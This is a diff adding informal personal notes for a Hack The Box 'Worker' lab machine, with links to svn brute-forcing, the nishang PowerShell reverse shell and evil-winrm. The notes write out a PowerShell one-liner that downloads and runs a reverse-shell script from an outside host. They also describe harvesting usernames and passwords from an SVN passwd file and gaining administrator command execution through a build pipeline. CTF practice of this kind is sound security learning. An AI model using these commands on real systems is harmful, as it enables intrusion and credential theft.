@@ -1,0 +1,22 @@
+commands to execute of htbworker.aspx
+
+link: https://nmap.org/nsedoc/scripts/svn-brute.html
+https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1
+https://www.perforce.com/blog/vcs/svn-commands-cheat-sheet
+command
+for getting reverse shell: 
+powershell -exec bypass iex(new-object net.webclient).downloadstring('http://10.10.14.28:8000/rev.ps1')
+after getting reverse shell 
+checkusername: 
+$env:UserName
+checkdiskmanagement: 
+get-psdrive -psprovider filesystem
+after going to W:\ 
+and smowere in svnrepos find conf\passwd and got many username and password and in users of c drive robisl is mentioned so collecting its info and get login in through it to the web page
+
+for getting root : create a new pipeline : basically by pipeline we an execute any command to the adminstrator directly through the webpage and can see the output : procedure is below o nthe links 
+
+// links used 
+https://hackingwebservice.wordpress.com/2020/10/22/hackthebox-worker-machine-writeup/
+https://www.youtube.com/watch?v=15v7V9_7HfI
+https://kalilinuxtutorials.com/evil-winrm-hacking-pentesting/
